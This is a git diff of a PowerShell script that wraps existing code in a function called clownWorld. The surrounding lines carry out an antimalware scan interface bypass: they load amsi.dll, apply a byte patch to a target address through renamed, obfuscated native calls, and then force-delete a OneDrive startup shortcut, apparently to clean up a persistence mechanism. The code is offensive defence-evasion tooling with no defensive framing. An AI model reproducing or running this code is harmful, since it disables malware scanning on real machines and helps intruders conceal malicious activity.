@@ -20,6 +20,8 @@ Class Hunter {
     }
 }
 
+function clownWorld {
+
 [IntPtr]$hModule = [ClownWorld]::LoadLibrary("amsi.dll")
 Write-Host "[+] AMSI DLL Handle: $hModule"
 
@@ -63,6 +65,10 @@ $patch = [byte[]] (
 sleep 10
 $ten = 0
 [ClownWorld]::CustomChicken($targetedAddress, [uint32]2, $yoyo, [ref]$ten) | Out-Null
+}
+
+
+
 
 #sleep 5
 rm "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk" -Force
